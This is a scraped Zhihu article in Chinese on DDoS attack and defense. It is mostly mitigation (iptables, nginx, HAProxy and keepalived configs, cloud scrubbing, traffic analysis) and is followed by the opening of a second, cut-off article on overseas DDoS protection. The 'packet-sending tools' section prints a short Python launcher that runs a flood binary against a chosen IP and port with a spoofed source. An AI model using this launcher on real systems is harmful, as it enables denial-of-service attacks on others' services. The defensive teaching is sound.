height=&#39;471&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"930\" data-rawheight=\"471\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"930\" data-original=\"https://pic1.zhimg.com/v2-861cbc47332a6ce08dd9b78a1cad14ec_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-861cbc47332a6ce08dd9b78a1cad14ec_b.jpg\"/><figcaption>图6</figcaption></figure><h2><b>攻击系统资源</b></h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-c304a708bb860a3156f612e0a1a93780_b.jpg\" data-size=\"normal\" data-rawwidth=\"936\" data-rawheight=\"543\" class=\"origin_image zh-lightbox-thumb\" width=\"936\" data-original=\"https://pic1.zhimg.com/v2-c304a708bb860a3156f612e0a1a93780_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;936&#39; height=&#39;543&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"936\" data-rawheight=\"543\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"936\" data-original=\"https://pic1.zhimg.com/v2-c304a708bb860a3156f612e0a1a93780_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-c304a708bb860a3156f612e0a1a93780_b.jpg\"/><figcaption>图7</figcaption></figure><h2><b>攻击应用资源</b></h2><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-dc585497a54a05f41ba24a791663c44f_b.jpg\" data-size=\"normal\" data-rawwidth=\"943\" data-rawheight=\"506\" class=\"origin_image zh-lightbox-thumb\" width=\"943\" data-original=\"https://pic4.zhimg.com/v2-dc585497a54a05f41ba24a791663c44f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;943&#39; height=&#39;506&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"943\" data-rawheight=\"506\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"943\" data-original=\"https://pic4.zhimg.com/v2-dc585497a54a05f41ba24a791663c44f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-dc585497a54a05f41ba24a791663c44f_b.jpg\"/><figcaption>图8</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2><b>DDoS防护科普</b></h2><h2><b>攻击防护原理</b></h2><p>从tcp/udp协议栈原理介绍DDoS防护原理：</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-4d262e3686a1e8e6f27b0b540fc4e567_b.jpg\" data-size=\"normal\" data-rawwidth=\"1126\" data-rawheight=\"692\" class=\"origin_image zh-lightbox-thumb\" width=\"1126\" data-original=\"https://pic4.zhimg.com/v2-4d262e3686a1e8e6f27b0b540fc4e567_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1126&#39; height=&#39;692&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"1126\" data-rawheight=\"692\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1126\" data-original=\"https://pic4.zhimg.com/v2-4d262e3686a1e8e6f27b0b540fc4e567_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-4d262e3686a1e8e6f27b0b540fc4e567_b.jpg\"/><figcaption>图9</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>syn flood:</p><p>可以在收到客户端第三次握手reset 、第二次握手发送错误的ack，等Client回复Reset，结合信任机制进行判断。</p><p>ack flood:</p><p>丢弃三次ack，让对方重连：重发syn建立链接，后续是syn flood防护原理；学习正常ack的源，超过阈值后，该ack没有在正常源列表里面就丢弃ack三次，让对方重连：重发syn建立链接，后续是syn flood防护</p><p>udp flood:</p><p>1、限速启动阈值，一秒钟去往服务器IP的同一端口的UDP包数目，如果是web服务器，可以设置严格一些2、报文内容特征–模式匹配模式匹配规则主要用于过滤包内容带特征字符的攻击包3、IP特征–ACL若遇到1）源IP+目的固定；2）流量超过1G==&gt;在网络设备层面使用acl进行过滤</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-77f5f299463a163090b3e48167da6fb4_b.jpg\" data-size=\"normal\" data-rawwidth=\"543\" data-rawheight=\"282\" class=\"origin_image zh-lightbox-thumb\" width=\"543\" data-original=\"https://pic1.zhimg.com/v2-77f5f299463a163090b3e48167da6fb4_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;543&#39; height=&#39;282&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"543\" data-rawheight=\"282\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"543\" data-original=\"https://pic1.zhimg.com/v2-77f5f299463a163090b3e48167da6fb4_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-77f5f299463a163090b3e48167da6fb4_b.jpg\"/><figcaption>表2</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2><b>不同层面的防护</b></h2><h2><b>按攻击流量规模分类</b></h2><p>较小流量<br/>小于1000Mbps，且在服务器硬件与应用接受范围之内，并不影响业务的： <br/>利用iptables或者DDoS防护应用实现软件层防护</p><p>大型流量 <br/>大于1000Mbps，但在DDoS清洗设备性能范围之内，且小于机房出口，可能影响相同机房的其他业务的： <br/>利用iptables或者DDoS防护应用实现软件层防护，或者在机房出口设备直接配置黑洞等防护策略，或者同时切换域名，将对外服务IP修改为高负载Proxy集群外网IP或者CDN高仿IP或者公有云DDoS防护网关IP，由其代理到RealServer；或者直接接入DDoS清洗设备</p><p>超大规模流量 <br/>在DDoS清洗设备性能范围之外，但在机房出口性能之内，可能影响相同机房的其他业务，或者大于机房出口，已经影响相同机房的所有业务或大部分业务的： <br/>联系运营商检查分组限流配置部署情况并观察业务恢复情况</p><h2><b>按攻击流量协议分类</b></h2><p>syn/fin/ack等tcp协议包<br/>设置预警阀值和响应阀值，前者开始报警，后者开始处理，根据流量大小和影响程度调整防护策略和防护手段，逐步升级。</p><p>udp/dns query等udp协议包<br/>对于大部分游戏业务来说，都是TCP协议的，所以可以根据业务协议制定一份tcp协议白名单，如果遇到大量udp请求，可以不经产品确认或者延迟跟产品确认，直接在系统层面/HPPS或者清洗设备上丢弃udp包。</p><p>http flood/CC等需要跟数据库交互的攻击 <br/>这种一般会导致数据库或者webserver负载很高或者连接数过高，在限流或者清洗流量后可能需要重启服务才能释放连接数，因此更倾向在系统资源能够支撑的情况下调大支持的连接数。相对来说，这种攻击防护难度较大，对防护设备性能消耗很大。</p><p>其他 <br/>icmp包可以直接丢弃，先在机房出口以下各个层面做丢弃或者限流策略。现在这种攻击已经很少见，对业务破坏力有限。</p><h2><b>DDoS攻击与防护实践</b></h2><h2><b>自建DDoS平台</b></h2><p>现在有开源的DDoS平台源代码，只要有足够机器和带宽资源，随时都能部署一套极具杀伤力的DDoS平台，如下图的第三种方案。</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-afc3729085a4d1a758a610917cd4da28_b.jpg\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"568\" class=\"origin_image zh-lightbox-thumb\" width=\"853\" data-original=\"https://pic1.zhimg.com/v2-afc3729085a4d1a758a610917cd4da28_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;853&#39; height=&#39;568&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"568\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"853\" data-original=\"https://pic1.zhimg.com/v2-afc3729085a4d1a758a610917cd4da28_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-afc3729085a4d1a758a610917cd4da28_b.jpg\"/><figcaption>图10</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2><b>发包工具</b></h2><p>下面提供一款常用DDoS客户端的发包代码，可以看到攻击方式非常丰富，ip、端口、tcp flag、包大小都是自定义的。</p><div class=\"highlight\"><pre><code class=\"language-python\"><span class=\"k\">def</span> <span class=\"nf\">func</span><span class=\"p\">():</span>\n        <span class=\"n\">os</span><span class=\"o\">.</span><span class=\"n\">system</span><span class=\"p\">(</span><span class=\"s2\">&#34;./txDDoS -a &#34;</span><span class=\"o\">+</span><span class=\"nb\">type</span><span class=\"o\">+</span><span class=\"s2\">&#34; -d &#34;</span><span class=\"o\">+</span><span class=\"n\">ip</span><span class=\"o\">+</span><span class=\"s2\">&#34; -y &#34;</span><span class=\"o\">+</span><span class=\"n\">port</span><span class=\"o\">+</span><span class=\"s2\">&#34; -f 0x10 -s 10.10.10.10 -l 1300&#34;</span><span class=\"p\">)</span>\n<span class=\"k\">if</span> <span class=\"vm\">__name__</span> <span class=\"o\">==</span> <span class=\"s2\">&#34;__main__&#34;</span><span class=\"p\">:</span>\n  <span class=\"n\">pool</span> <span class=\"o\">=</span> <span class=\"n\">multiprocessing</span><span class=\"o\">.</span><span class=\"n\">Pool</span><span class=\"p\">(</span><span class=\"n\">processes</span><span class=\"o\">=</span><span class=\"nb\">int</span><span class=\"p\">(</span><span class=\"n\">nbproc</span><span class=\"p\">))</span>\n  <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">xrange</span><span class=\"p\">(</span><span class=\"nb\">int</span><span class=\"p\">(</span><span class=\"n\">nbproc</span><span class=\"p\">)):</span>\n      <span class=\"n\">pool</span><span class=\"o\">.</span><span class=\"n\">apply_async</span><span class=\"p\">(</span><span class=\"n\">func</span><span class=\"p\">)</span>\n  <span class=\"n\">pool</span><span class=\"o\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>\n  <span class=\"n\">pool</span><span class=\"o\">.</span><span class=\"n\">join</span><span class=\"p\">()</span></code></pre></div><p>讲完了DDoS攻击的实现方式，下面介绍如何从iptables、应用自身和高性能代理等角度去防御DDoS攻击。</p><h2><b>iptables防护</b></h2><div class=\"highlight\"><pre><code class=\"language-text\">sysctl -w net.ipv4.ip_forward=1 &amp;&gt;/dev/null\n#打开转发\nsysctl -w net.ipv4.tcp_syncookies=1 &amp;&gt;/dev/null\n#打开 syncookie （轻量级预防 DOS 攻击）\nsysctl -w net.ipv4.netfilter.ip_conntrack_tcp_timeout_established=3800 &amp;&gt;/dev/null\n#设置默认 TCP 连接最大时长为 3800 秒（此选项可以大大降低连接数）\nsysctl -w net.ipv4.ip_conntrack_max=300000 &amp;&gt;/dev/n\n#设置支持最大连接树为 30W（这个根据你的内存和 iptables 版本来，每个 connection 需要 300 多个字节）\niptables -N syn-flood\niptables -A INPUT -p tcp --syn -j syn-flood\niptables -I syn-flood -p tcp -m limit --limit 3/s --limit-burst 6 -j RETURN\niptables -A syn-flood -j REJECT\n#防止SYN攻击 轻量级预防\niptables -A INPUT -i eth0 -p tcp --syn -m connlimit --connlimit-above 15 -j DROP\niptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT\n#防止DOS太多连接进来,可以允许外网网卡每个IP最多15个初始连接,超过的丢弃</code></pre></div><h2><b>应用自身防护</b></h2><p>以Nginx为例，限制单个ip请求频率。</p><div class=\"highlight\"><pre><code class=\"language-text\">http { \nlimit_req_zone $binary_remote_addr zone=one:10m rate=10r/s; //触发条件，所有访问ip 限制每秒10个请求 \nserver {        \n        location  ~ \\.php$ { \n            limit_req zone=one burst=5 nodelay;   //执行的动作,通过zone名字对应     }\n            }\n  location /download/ { \n            limit_conn addr 1;    // 限制同一时间内1个连接，超出的连接返回503              \n       } \n      } \n  } </code></pre></div><h2><b>高性能代理</b></h2><h2><b>Haproxy+keepalived</b></h2><p>1.Haproxy配置</p><p>前端：</p><div class=\"highlight\"><pre><code class=\"language-text\">frontend http\nbind 10.0.0.20:80\nacl anti_DDoS always_true\n#白名单\nacl whiteip src -f /usr/local/haproxy/etc/whiteip.lst\n#标记非法用户\nstick-table type ip size 20k expire 2m store gpc0\ntcp-request connection track-sc1 src\n \ntcp-request inspect-delay 5s\n#拒绝非法用户建立连接\ntcp-request connection reject if anti_DDoS { src_get_gpc0 gt 0 }</code></pre></div><p>后端：</p><div class=\"highlight\"><pre><code class=\"language-text\">backend xxx.xxx.cn\nmode http\noption forwardfor\noption httplog\nbalance roundrobin\ncookie SERVERID insert indirect\noption httpchk GET /KeepAlive.ashx HTTP/1.1\\r\\nHost:\\ server.1card1.cn\nacl anti_DDoS always_false\n#白名单\nacl whiteip src -f /usr/local/haproxy/etc/whiteip.lst\n#存储client10秒内的会话速率\nstick-table type ip size 20k expire 2m store http_req_rate(10s),bytes_out_rate(10s)\ntcp-request content track-sc2 src\n#十秒内会话速率超过50个则可疑\nacl conn_rate_limit src_http_req_rate(server.1card1.cn) gt 80\n#判断http请求中是否存在SERVERID的cookie\nacl cookie_present cook(SERVERID) -m found\n#标记为非法用户\nacl mark_as_abuser sc1_inc_gpc0 gt 0\ntcp-request content reject if anti_DDoS !whiteip conn_rate_limit mark_as_abuser</code></pre></div><p>2.keepalived配置</p><div class=\"highlight\"><pre><code class=\"language-text\">global_defs {\n    router_id {{ server_id }}\n}\nvrrp_script chk_haproxy{\n    script &#34;/home/proxy/keepalived/{{ project }}/check_haproxy_{{ server_id  }}.sh&#34;\n    interval 2\n    weight -10\n}\nvrrp_instance VI_1 {\n    state {{ role }}\n    interface {{ interface }}\n    virtual_router_id 10{{ tag }}  \n    priority {{ value }}   \n    advert_int 1  \n    authentication {\n    auth_type PASS \n    auth_pass keepalived_DDoS\n    track_script {   \n        chk_haproxy \n    } \n}\nvirtual_ipaddress {\n    {{ vip }}/24 dev {{ interface }} label {{ interface }}:{{ tag }}\n}</code></pre></div><h2><b>接入CDN高防IP或公有云智能DDoS防御系统</b></h2><p>由于cdn高防ip和公有云智能DDoS防御原理比较相近，都是利用代理或者dns调度的方式进行“引流-&gt;清洗-&gt;回注”的防御流程，因此将两者合并介绍。</p><h2><b>CDN高防IP</b></h2><p>是针对互联网服务器在遭受大流量的DDoS攻击后导致服务不可用的情况下，推出的付费增值服务，用户可以通过配置高防IP，将攻击流量引流到高防IP，确保源站的稳定可靠。通常可以提供高达几百Gbps的防护容量，抵御一般的DDoS攻击绰绰有余。</p><h2><b>公有云智能DDoS防御系统</b></h2><p>如图11，主要由以下几个角色组成：</p><p>调度系统，在DDoS分布式防御系统中起着智能域名解析、网络监控、流量调度等作用。<br/>源站，开发商业务服务器。<br/>攻击防护点，主要作用是过滤攻击流量，并将正常流量转发到源站。</p><p>后端机房：在DDoS分布式防御系统中会与攻击防护点配合起来，以起到超大流量的防护作用，提供双重防护的能力。<br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-08605a6abbe951078e6a461dfaf31297_b.jpg\" data-size=\"normal\" data-rawwidth=\"714\" data-rawheight=\"529\" class=\"origin_image zh-lightbox-thumb\" width=\"714\" data-original=\"https://pic4.zhimg.com/v2-08605a6abbe951078e6a461dfaf31297_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;714&#39; height=&#39;529&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"714\" data-rawheight=\"529\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"714\" data-original=\"https://pic4.zhimg.com/v2-08605a6abbe951078e6a461dfaf31297_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-08605a6abbe951078e6a461dfaf31297_b.jpg\"/><figcaption>图11</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>一般CDN或者公有云都有提供邮件、web系统、微信公众号等形式的申请、配置流程，基本上按照下面的思路操作即可：</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-7ab5fbed4d1301d22375609fe0dc7483_b.jpg\" data-size=\"normal\" data-rawwidth=\"970\" data-rawheight=\"104\" class=\"origin_image zh-lightbox-thumb\" width=\"970\" data-original=\"https://pic4.zhimg.com/v2-7ab5fbed4d1301d22375609fe0dc7483_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;970&#39; height=&#39;104&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"970\" data-rawheight=\"104\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"970\" data-original=\"https://pic4.zhimg.com/v2-7ab5fbed4d1301d22375609fe0dc7483_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-7ab5fbed4d1301d22375609fe0dc7483_b.jpg\"/><figcaption>图12</figcaption></figure><p>步骤主要有：</p><p>1-向公有云or CDN厂商申请接入高防IP或者DDoS清洗系统，同时提交站点域名原解析记录</p><p>2-修改站点域名解析记录指向公有云or CDN厂商提供的ip</p><p>3-公有云or CDN厂商清洗DDoS攻击流量，将清洗过后的正常流量回送到站点域名原解析记录的ip</p><h2><b>公有云DDoS防护服务介绍</b></h2><p>目前大部分公有云厂商都把DDoS防护列入服务清单，但由于技术、资源、管理等方面的区别，存在着以下不同点：</p><p>1.计费模式不同：有的将DDoS防护作为附赠服务，有的将DDoS防护收费，而且不同厂商的收费价格或者收费起点都不同。</p><p>2.业务场景不同：有的公有云厂商会区分客户业务场景，比如直播、金融、游戏之类，但大部分厂商并不会区分这么细。</p><p>3.功能丰富度不同：公有云DDoS防护服务提供给用户自定义的东西多少，依赖于产品成熟度。</p><p>4.清洗能力不同：DDoS清洗流量规模因厂家差异从几十Gbps到几百Gbps，使用的防御技术成熟度和效果也各有差异，比如有的cc攻击防御效果立杆见影，有的则非常一般。</p><h2><b>网易云DDoS防护服务介绍</b></h2><p>网易云为用户提供5Gbps以下的免费异常流量清洗，超过5Gbps以上会根据攻击规模和资源情况确定是否继续清洗，目前并未对此服务收费。目前网易云提供的DDoS防护功能有：</p><p>1. DDoS攻击流量监控、统计与报警</p><p>2. DDoS清洗策略用户自定义，主要有流量大小、包数以及请求数等三个维度</p><h2><b>DDoS攻击处理技巧荟萃</b></h2><h2><b>1.发现</b></h2><p>Rsyslog</p><p>流量监控报警</p><p>查看/var/log/messages（freebsd），/var/log/syslog（debian），是否有被攻击的信息：</p><div class=\"highlight\"><pre><code class=\"language-text\">*SYN Flood**RST \nlimit xxx to xxx**\nlisten queue limit*</code></pre></div><p>查看系统或者应用连接情况，特别是连接数与系统资源占用情况</p><div class=\"highlight\"><pre><code class=\"language-text\">netstat -antp | grep -i &#39;业务端口&#39; | wc -l\nsar -n DEV </code></pre></div><h2><b>2攻击类型分析</b></h2><p>2.1 Tcpdump+wireshark</p><p>使用tcpdump实时抓包给wireshark进行解析，有了wireshark实现自动解析和可视化展示，处理效率非一般快</p><div class=\"highlight\"><pre><code class=\"language-text\">Tcpdump -i eth0 -w test.pcap</code></pre></div><p>比如通过目标端口和特殊标记识别ssdp flood：</p><div class=\"highlight\"><pre><code class=\"language-text\">udp.dstport == 1900\n(udp contains &#34;HTTP/1.1&#34;) and (udp contains 0a:53:54:3a)</code></pre></div><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-bab25f217a4a84d68bf6cd15aefcad3e_b.jpg\" data-size=\"normal\" data-rawwidth=\"1259\" data-rawheight=\"599\" class=\"origin_image zh-lightbox-thumb\" width=\"1259\" data-original=\"https://pic3.zhimg.com/v2-bab25f217a4a84d68bf6cd15aefcad3e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1259&#39; height=&#39;599&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"1259\" data-rawheight=\"599\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1259\" data-original=\"https://pic3.zhimg.com/v2-bab25f217a4a84d68bf6cd15aefcad3e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-bab25f217a4a84d68bf6cd15aefcad3e_b.jpg\"/><figcaption>图13</figcaption></figure><p>2.2 高效的DDoS攻击探测与分析工具FastNetMon</p><p>也可以使用FastNetMon进行实时流量探测和分析，直接在命令行展示结果，但是如果攻击流量很大，多半是派不上用场了。</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-06d873de553dbbffa7e325a0559fd299_b.jpg\" data-size=\"normal\" data-rawwidth=\"448\" data-rawheight=\"289\" class=\"origin_image zh-lightbox-thumb\" width=\"448\" data-original=\"https://pic2.zhimg.com/v2-06d873de553dbbffa7e325a0559fd299_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;448&#39; height=&#39;289&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"448\" data-rawheight=\"289\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"448\" data-original=\"https://pic2.zhimg.com/v2-06d873de553dbbffa7e325a0559fd299_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-06d873de553dbbffa7e325a0559fd299_b.jpg\"/><figcaption>图14</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>2.3攻击溯源</p><p>Linux服务器上开启uRPF 反向路径转发协议，可以有效识别虚假源ip，将虚假源ip流量抛弃。另外，使用unicast稀释攻击流量，因为unicast的特点是源-目的=1:n，但消息只会发往离源最近的节点，所以可以把攻击引导到某个节点，确保其他节点业务可用。</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-5c90035c3d5cb6f40f96ab5374152475_b.jpg\" data-size=\"normal\" data-rawwidth=\"433\" data-rawheight=\"128\" class=\"origin_image zh-lightbox-thumb\" width=\"433\" data-original=\"https://pic2.zhimg.com/v2-5c90035c3d5cb6f40f96ab5374152475_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;433&#39; height=&#39;128&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"433\" data-rawheight=\"128\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"433\" data-original=\"https://pic2.zhimg.com/v2-5c90035c3d5cb6f40f96ab5374152475_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-5c90035c3d5cb6f40f96ab5374152475_b.jpg\"/><figcaption>图15</figcaption></figure>图15<p class=\"ztext-empty-paragraph\"><br/></p><h2><b>企业级DDoS清洗系统架构探讨</b></h2><h2><b>自研</b></h2><p>使用镜像/分光（采集）+sflow/netflow（分析）+DDoS清洗设备（清洗）三位一体的架构是目前很多企业采用的防D架构，但是一般只适用于有自己机房或者在IDC业务规模比较大的企业。如下图所示，在IDC或者自建机房出口下通过镜像/分光采集流量，集中到异常流量监测系统中进行分析，一旦发现异常流量，则与DDoS清洗设备进行联动，下发清洗规则和路由规则进行清洗。</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-cde21559d8438dee1f2f798fc4654a83_b.jpg\" data-size=\"normal\" data-rawwidth=\"572\" data-rawheight=\"372\" class=\"origin_image zh-lightbox-thumb\" width=\"572\" data-original=\"https://pic4.zhimg.com/v2-cde21559d8438dee1f2f798fc4654a83_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;572&#39; height=&#39;372&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"572\" data-rawheight=\"372\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"572\" data-original=\"https://pic4.zhimg.com/v2-cde21559d8438dee1f2f798fc4654a83_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-cde21559d8438dee1f2f798fc4654a83_b.jpg\"/><figcaption>图16</figcaption></figure><h2><b>商用</b></h2><p>现在很多网络设备厂商/安全厂商都有成体系的流量采集、异常流量检测和清洗产品，比如绿盟、华为、思科、Arbo等，相关产品在业界都很出名且各有市场，愿意通过采购构建企业DDoS防护体系的企业可以了解、购买相应的产品，这里不多赘述。</p><h2><b>混合</b></h2><p>对于大型企业而言，由于网络环境和业务规模比较大，DDoS清洗架构不会采用单一的商用或者自研方案，而是混合了自研、商用以及公有云等多种方案，具体实现可参考上文介绍。</p><p>至此，DDoS攻击与防御：从原理到实践第一部分介绍完毕，欢迎大家多提真知灼见。</p><h2><b>参考资料</b></h2><p>1.走近科学：揭秘在线DDoS攻击平台（上）</p><p><a href=\"https://link.zhihu.com/?target=http%3A//www.freebuf.com/special/107119.html\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://www.</span><span class=\"visible\">freebuf.com/special/107</span><span class=\"invisible\">119.html</span><span class=\"ellipsis\"></span></a></p><p>走近科学：揭秘在线DDoS攻击平台（下）</p><p><a href=\"https://link.zhihu.com/?target=http%3A//www.freebuf.com/news/107916.html\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://www.</span><span class=\"visible\">freebuf.com/news/107916</span><span class=\"invisible\">.html</span><span class=\"ellipsis\"></span></a></p><p>2.卡巴斯基DDoS调查报告</p><p><u><a href=\"https://link.zhihu.com/?target=https%3A//securelist.com/analysis/quarterly-malware-reports/76464/kaspersky-ddos-intelligence-report-for-q3-2016/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">https://securelist.com/analysis/quarterly-malware-reports/76464/kaspersky-DDoS-intelligence-report-for-q3-2016/</a></u></p><p>3.DDoS攻击报道<a href=\"https://link.zhihu.com/?target=http%3A//tech.huanqiu.com/cloud/2014-12/5288347.html\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">tech.huanqiu.com/cloud/</span><span class=\"invisible\">2014-12/5288347.html</span><span class=\"ellipsis\"></span></a></p><p>4.高效的DDoS攻击探测与分析工具FastNetMon <u><a href=\"https://link.zhihu.com/?target=http%3A//www.freebuf.com/news/67204.html\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://www.</span><span class=\"visible\">freebuf.com/news/67204.</span><span class=\"invisible\">html</span><span class=\"ellipsis\"></span></a></u></p><p>5.腾讯宙斯盾系统构建之路 <u><a href=\"https://link.zhihu.com/?target=https%3A//security.tencent.com/index.php/blog/msg/62\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">security.tencent.com/in</span><span class=\"invisible\">dex.php/blog/msg/62</span><span class=\"ellipsis\"></span></a></u></p><p>6.鲍旭华等《破坏之王:DDoS攻击与防范深度剖析》</p>", 
            "topic": [
                {
                    "tag": "网络攻击", 
                    "tagLink": "https://api.zhihu.com/topics/19568943"
                }, 
                {
                    "tag": "黑客攻击", 
                    "tagLink": "https://api.zhihu.com/topics/19638541"
                }, 
                {
                    "tag": "DDoS", 
                    "tagLink": "https://api.zhihu.com/topics/19591790"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/43422797", 
            "userName": "tuhao", 
            "userLink": "https://www.zhihu.com/people/5353f3263f6ecf860f2db3e773960f09", 
            "upvote": 3, 
            "title": "中国企业海外业务DDoS防护探索", 
            "content": "<p>近些年国内市场，尤其是互联网行业，竞争非常激烈，也越来越饱和，于是很多产品纷纷出海。他们的发行方式多种多样，服务部署方式相应的有所不同：有自己部署在aws/gcp/azure等公有云上的，也有部署在海外IDC服务器的，这两种方式面对的安全威胁也多种多样，但有一点是共同的，那就是DDoS攻击。因此，当下研究中国企业海外业务DDoS防护解决方案，显得十分必要。</p><h2>概况</h2><p>目前中国企业海外业务被DDoS情况，还没有相关报道，不过海外公有云那边可能会有比较多的数据，可惜没有公开，希望有这块数据分析的读者能分享相关数据。下面笔者仅针对了解到的几家企业的情况做些简单介绍。</p><p>公司1：大型移动工具开发商，目前主要用户来源海外，业务覆盖超过100个国家。由于发展非常迅速，他们的业务部署在AWS，同时购买了Enterprise Support。在DDoS攻击方面，他们可谓是“香饽饽”。面对年均超过100次、峰值流量几十Gbps的DDoS攻击，他们立足于AWS Marketplace和AWS Shield进行DDoS防御。</p><p>公司2：大型游戏厂商，目前主要用户来自国内，但国外业务增长速度很快，已经有近10款游戏在海外发行。面对年均超过1000次，峰值流量超过100Gbps的DDoS攻击，他们的应对方案有些不同。由于家大业大，加上自家提供公有云服务，他们选择让公有云节点随企业业务走，比如游戏业务开到哪里，清洗服务就开到哪里。如果公有云无法覆盖，则会跟当地IDC或者当地公有云合作。</p><p>这两家企业都是其所在行业的标杆企业，他们所面临的DDoS困境以及采取的应对手段十分具有代表性，也对国内企业出海有重要参考价值。下面笔者试着梳理一下具体的应对措施。</p><h2>应对措施</h2><p>主要包括服务器内部安全、外部安全服务两种方式。其中，外部服务安全主要是公有云和IDC两种提供商。</p><h2>服务器安全</h2><p>在接入外部的DDoS防御手段前，还需先做好服务器本地安全。</p><h2>缩小攻击面</h2><p>这一点通常也公有云抗D最佳实践之中。</p><ul><li>开放尽可能少的端口</li><ul><li>内部流量走内网，避免走外网受攻击影响</li></ul></ul><p 